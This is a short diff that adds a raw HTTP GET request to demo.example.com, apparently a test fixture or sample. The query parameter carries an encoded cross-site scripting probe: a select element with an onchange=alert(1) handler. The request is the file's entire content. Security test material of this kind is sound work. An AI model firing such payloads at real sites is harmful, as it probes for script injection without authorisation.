@@ -1,0 +1,4 @@
+GET /a?id=\u003Cselect%20onchange%3Dalert(1)\u003E\u003Coption\u003E1\u003C/option\u003E\u003C/select\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
